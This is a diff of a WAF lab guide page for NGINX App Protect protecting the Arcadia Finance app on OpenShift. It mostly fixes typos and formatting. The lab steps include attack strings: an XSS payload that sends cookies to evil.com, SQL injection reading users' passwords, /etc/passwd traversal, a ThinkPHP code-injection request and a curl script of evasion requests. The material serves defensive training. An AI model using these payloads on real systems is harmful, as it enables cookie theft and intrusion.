@@ -109,6 +109,7 @@
 <main class="article">
 <div class="toolbar" role="navigation">
 <button class="nav-toggle"></button>
+  <a href="index.html" class="home-link"></a>
 <nav class="breadcrumbs" aria-label="breadcrumbs">
   <ul>
     <li><a href="index.html">Default Title</a></li>
@@ -129,8 +130,6 @@ protect against Layer 7 attacks. Follow these steps:</p>
 <div class="paragraph">
 <p>Launch the Firefox browser and open Arcadia Finance app:</p>
 </div>
-<div class="quoteblock">
-<blockquote>
 <div class="admonitionblock note">
 <table>
 <tr>
@@ -140,7 +139,7 @@ protect against Layer 7 attacks. Follow these steps:</p>
 <td class="content">
 <div class="title">Note</div>
 <div class="paragraph">
-<p>Make sure you get the nginx-ingress EXTERNAL-IP with commmand
+<p>Make sure you get the nginx-ingress EXTERNAL-IP with the command
 <code>oc get svc --namespace=nginx-ingress</code></p>
 </div>
 </td>
@@ -150,14 +149,14 @@ protect against Layer 7 attacks. Follow these steps:</p>
 <div class="olist arabic">
 <ol class="arabic">
 <li>
-<p>In the Browser, open NGINX Ingress Controller URL to access Arcadia
-app (replace with the nginx-ingress EXTERNAL-IP): <a href="http://EXTERNAL-IP/" class="bare">http://EXTERNAL-IP/</a></p>
+<p>In the browser, open the NGINX Ingress Controller URL to access the Arcadia
+app (replace with the nginx-ingress EXTERNAL-IP): <code><a href="http://EXTERNAL-IP/" class="bare">http://EXTERNAL-IP/</a></code></p>
 </li>
 <li>
 <p>Click on <code>Login</code> and use the credentials <code>matt:ilovef5</code></p>
 </li>
 <li>
-<p>You should see all the apps running (main, back, app2 and app3)</p>
+<p>You should see all the apps running (main, back, app2, and app3)</p>
 </li>
 <li>
 <p>Execute the same XSS attack we did in Module 1 by appending
@@ -184,26 +183,26 @@ Your support ID is: 5374014569933997707
 <td class="content">
 <div class="title">Note</div>
 <div class="paragraph">
-<p>Did you notice the blocking page is similar to F5 ASM and Adv. WAF ?</p>
+<p>Did you notice the blocking page is similar to F5 ASM and Adv. WAF?</p>
 </div>
 </td>
 </tr>
 </table>
 </div>
 <div class="paragraph">
-<p><span class="image unresolved"><img src="./pictures/image18.png" alt="image"></span></p>
+<p><span class="image"><img src="_images/image18.png" alt="image"></span></p>
 </div>
 <div class="olist arabic">
 <ol class="arabic">
 <li>
 <p>Execute the second attack by appending
 <code>?item='&gt;&lt;script&gt;document.location='http://evil.com/steal'+document.cookie&lt;/script&gt;</code>
-to the application URL, and observe the results</p>
+to the application URL, and observe the results.</p>
 </li>
 </ol>
 </div>
 <div class="paragraph">
-<p><span class="image unresolved"><img src="./pictures/image19.png" alt="image"></span></p>
+<p><span class="image"><img src="_images/image19.png" alt="image"></span></p>
 </div>
 <div class="olist arabic">
 <ol class="arabic">
@@ -212,8 +211,6 @@ to the application URL, and observe the results</p>
 results.</p>
 </li>
 </ol>
-</div>
-</blockquote>
 </div>
 <div class="paragraph">
 <p>Congratulations on securing your application!</p>
@@ -230,7 +227,7 @@ results.</p>
 <td class="content">
 <div class="title">Note</div>
 <div class="paragraph">
-<p>Execute the attack by appending such string as
+<p>Execute the attack by appending the following string:
 <code>?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+</code> to the end of
 the application URL.</p>
 </div>
@@ -249,21 +246,23 @@ the application URL.</p>
 <code>GET /?hfsagrs=php%3A%2F%2Ffilter%2Fresource%3Dhttp%3A%2F%2Fgoogle.com%2Fsearch</code></p>
 </li>
 <li>
-<p>Command Execution - <code>GET /?hfsagrs=%2Fproc%2Fself%2Fenviron</code></p>
+<p>Command Execution -
+<code>GET /?hfsagrs=%2Fproc%2Fself%2Fenviron</code></p>
 </li>
 <li>
-<p>HTTP Parser Attack - <code>GET /?XDEBUG_SESSION_START=phpstorm</code></p>
+<p>HTTP Parser Attack -
+<code>GET /?XDEBUG_SESSION_START=phpstorm</code></p>
 </li>
 <li>
 <p>Predictable Resource Location Path Traversal -
 <code>GET /lua/login.lua?referer=google.com%2F&amp;hfsagrs=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></p>
 </li>
 <li>
-<p>Cross Site Scripting -
+<p>Cross-Site Scripting -
 <code>GET /lua/login.lua?referer=google.com%2F&amp;hfsagrs=oNmouseoVer%3Dbfet%28%29</code></p>
 </li>
 <li>
-<p>Informtion Leakage -
+<p>Information Leakage -
 <code>GET /lua/login.lua?referer=google.com%2F&amp;hfsagrs=efw</code></p>
 </li>
 <li>
@@ -271,21 +270,19 @@ the application URL.</p>
 <code>GET /dana-na/auth/url_default/welcome.cgi</code></p>
 </li>
 <li>
-<p>Non-browser Client,Abuse of Functionality,Server Side Code
-Injection,HTTP Parser Attack -
+<p>Non-browser Client, Abuse of Functionality, Server Side Code
+Injection, HTTP Parser Attack -
 <code>GET /index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=HelloThinkPHP</code></p>
 </li>
 <li>
-<p>Cross Site Scripting -
-<code>GET / HTTP/1.1\r\nHost: &lt;ATTACKED HOST&gt;\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: <strong>/</strong>\r\nAccept-Encoding: gzip,deflate\r\nCookie: hfsagrs=%27%22%5C%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E\r\n\r\n"</code></p>
+<p>Cross-Site Scripting -
+<code>GET / HTTP/1.1\r\nHost: &lt;ATTACKED HOST&gt;\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: <strong>/</strong>\r\nAccept-Encoding: gzip,deflate\r\nCookie: hfsagrs=%27%22%5C%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E\r\n\r\n</code></p>
 </li>
 </ul>
 </div>
 <div class="paragraph">
-<p><strong>and many more from bash script below (Just for your information)</strong></p>
+<p><strong>and many more from the bash script below (Just for your information)</strong></p>
 </div>
-<div class="quoteblock">
-<blockquote>
 <div class="admonitionblock note">
 <table>
 <tr>
@@ -296,78 +293,67 @@ Injection,HTTP Parser Attack -
 <div class="title">Note</div>
 <div class="paragraph">
 <p>Execute the attack by running the following bash script from the
-terminal window</p>
+terminal window:</p>
 </div>
 </td>
 </tr>
 </table>
 </div>
-<div class="paragraph">
-<p>#!/bin/bash echo "------------------------------" echo "Starting
-security testing&#8230;&#8203;" echo "------------------------------" echo "" echo
-""</p>
+<div class="listingblock">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">#!/bin/bash
+echo "------------------------------"
+echo "Starting security testing..."
+echo "------------------------------"
+echo ""
+
+# Get the external IP address of the NGINX Ingress Controller
+EXTERNAL_IP=$(oc get service my-nginx-ingress-controller-nginx-ingress -n nginx-ingress | awk 'NR==2{print $4}')
+
+echo "---------------------------------------------------------------------"
+echo "Multiple decoding"
+echo "Sending: curl -k 'http://$EXTERNAL_IP/three_decodin%2525252567.html'"
+echo "---------------------------------------------------------------------"
+
+# Send a request with multiple decoding
+curl -k "http://$EXTERNAL_IP/three_decodin%2525252567.html"
+sleep 3
+
+echo "-----------------------------------------------------------------------------"
+echo "Apache Whitespace"
+echo "Sending: curl -k 'http://$EXTERNAL_IP/tab_escaped%09.html'"
+echo "-----------------------------------------------------------------------------"
+
+# Send a request with Apache whitespace
+curl -k "http://$EXTERNAL_IP/tab_escaped%09.html"
+sleep 3
+
+echo "-----------------------------------------------------------------------------"
+echo "IIS Backslashes"
+echo "Sending: curl -k 'http://$EXTERNAL_IP/regular%5cescaped_back.html'"
+echo "-----------------------------------------------------------------------------"
+
+# Send a request with IIS backslashes
+curl -k "http://$EXTERNAL_IP/regular%5cescaped_back.html"
+sleep 3
+
+echo "-----------------------------------------------------------------------------"
+echo "Carriage Return Escaping"
+echo "Sending: curl -k 'http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&amp;y=2'"
+echo "-----------------------------------------------------------------------------"
+
+# Send a request with carriage return escaping
+curl -k "http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&amp;y=2"
+sleep 3
+
+echo "-----------------------------------------------------------------------------"
+echo "Cross-site scripting"
+echo "Sending: curl -k 'http://$EXTERNAL_IP/%25%25252541PPDATA%25'"
+echo "-----------------------------------------------------------------------------"
+
+# Send a request with cross-site scripting payload
+curl -k "http://$EXTERNAL_IP/%25%25252541PPDATA%25"</code></pre>
 </div>
-<div class="paragraph">
-<p># Get the external IP address of the NGINX Ingress Controller
-EXTERNAL_IP=$(oc get service my-nginx-ingress-controller-nginx-ingress
--n nginx-ingress | awk 'NR==2\{print $4}')</p>
-</div>
-<div class="paragraph">
-<p>echo
-"---------------------------------------------------------------------"
-echo "Multiple decoding" echo "Sending: curl -k
-'http://$EXTERNAL_IP/three_decodin%2525252567.html'" echo
-"---------------------------------------------------------------------"</p>
-</div>
-<div class="paragraph">
-<p># Send a request with multiple decoding curl -k
-"http://$EXTERNAL_IP/three_decodin%2525252567.html" sleep 3</p>
-</div>
-<div class="paragraph">
-<p>echo
-"-----------------------------------------------------------------------------"
-echo "Apache Whitespace" echo "Sending: curl -k
-'http://$EXTERNAL_IP/tab_escaped%09.html'" echo
-"-----------------------------------------------------------------------------"</p>
-</div>
-<div class="paragraph">
-<p># Send a request with Apache whitespace curl -k
-"http://$EXTERNAL_IP/tab_escaped%09.html" sleep 3</p>
-</div>
-<div class="paragraph">
-<p>echo
-"-----------------------------------------------------------------------------"
-echo "IIS Backslashes" echo "Sending: curl -k
-'http://$EXTERNAL_IP/regular%5cescaped_back.html'" echo
-"-----------------------------------------------------------------------------"</p>
-</div>
-<div class="paragraph">
-<p># Send a request with IIS backslashes curl -k
-"http://$EXTERNAL_IP/regular%5cescaped_back.html" sleep 3</p>
-</div>
-<div class="paragraph">
-<p>echo
-"-----------------------------------------------------------------------------"
-echo "Carriage Return Escaping" echo "Sending: curl -k
-'http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&amp;y=2'" echo
-"-----------------------------------------------------------------------------"</p>
-</div>
-<div class="paragraph">
-<p># Send a request with carriage return escaping curl -k
-"http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&amp;y=2" sleep 3</p>
-</div>
-<div class="paragraph">
-<p>echo
-"-----------------------------------------------------------------------------"
-echo "Cross site scripting" echo "Sending: curl -k
-'http://$EXTERNAL_IP/%25%25252541PPDATA%25'" echo
-"-----------------------------------------------------------------------------"</p>
-</div>
-<div class="paragraph">
-<p># Send a request with cross-site scripting payload curl -k
-"http://$EXTERNAL_IP/%25%25252541PPDATA%25"</p>
-</div>
-</blockquote>
 </div>
 <div class="sect2">
 <h3 id="_security_logging"><a class="anchor" href="#_security_logging"></a>Security Logging</h3>
@@ -379,10 +365,11 @@ follow these steps:</p>
 <ol class="arabic">
 <li>
 <p>Get the local syslog server POD.</p>
-<div class="quoteblock">
-<blockquote>
 <div class="paragraph">
 <p>In the terminal window, copy the below text and paste+enter:</p>
+</div>
+</li>
+</ol>
 </div>
 <div class="listingblock">
 <div class="content">
@@ -403,49 +390,29 @@ main-584fc64db4-kz5c8      1/1     Running   0          70m   10.131.0.22   ip-1
 syslog-bb47bd798-mhh64     1/1     Running   0          25m   10.129.2.46   ip-10-0-241-74.us-east-2.compute.internal    &lt;none&gt;           &lt;none&gt;</code></pre>
 </div>
 </div>
-</blockquote>
-</div>
-</li>
-<li>
-<p>Examine the logging matching the support ID of the attack</p>
-<div class="quoteblock">
-<blockquote>
-<div class="openblock">
-<div class="content">
 <div class="paragraph">
-<p>In the terminal window, copy the below text and paste+enter:</p>
+<p>+
+. Examine the logging matching the support ID of the attack.</p>
+</div>
+<div class="paragraph">
+<p>+
+In the terminal window, copy the below text and paste+enter:</p>
 </div>
 <div class="listingblock">
 <div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">oc exec -it pod/syslog-bb47bd798-mhh64  -- cat /var/log/messages | grep 7175144470433567675</code></pre>
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">oc exec -it pod/syslog-bb47bd798-mhh64 -- cat /var/log/messages | grep 7175144470433567675</code></pre>
 </div>
 </div>
 <div class="paragraph">
 <p>Where <code>pod/syslog-bb47bd798-mhh64</code> is the name of the pod and container
-where the syslog server is running. <code>7175144470433567675</code> is support ID
+where the syslog server is running. <code>7175144470433567675</code> is the support ID
 of the attack.</p>
 </div>
 <div class="paragraph">
 <p>Example:</p>
 </div>
-</div>
-</div>
-</blockquote>
-</div>
 <div class="paragraph">
-<p><span class="image unresolved"><img src="./pictures/image13.png" alt="image"></span></p>
-</div>
-</li>
-</ol>
-</div>
-<div class="quoteblock">
-<blockquote>
-<div class="openblock">
-<div class="content">
-
-</div>
-</div>
-</blockquote>
+<p><span class="image"><img src="_images/image13.png" alt="image"></span></p>
 </div>
 <div class="paragraph">
 <p>Congratulations on completing the Lab! You have learned how to deploy
